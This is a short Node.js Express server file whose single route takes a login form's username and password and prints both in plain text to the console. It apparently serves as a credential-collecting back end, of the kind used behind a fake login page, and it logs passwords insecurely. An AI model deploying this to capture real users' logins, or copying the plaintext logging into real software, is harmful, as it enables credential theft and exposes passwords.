// server.js
const express = require('express');
const bodyParser = require('body-parser');
const chalk = require('chalk');

const app = express();
const port = 3000;

// Middleware to parse incoming JSON or URL-encoded data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Route to handle POST requests from the login form
app.post('/', (req, res) => {
    const { username, password } = req.body;

    // Print credentials in green
    console.log(chalk.green(`Username: ${username}`));
    console.log(chalk.green(`Password: ${password}`));

    // Send a response
    res.send('Credentials received');
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
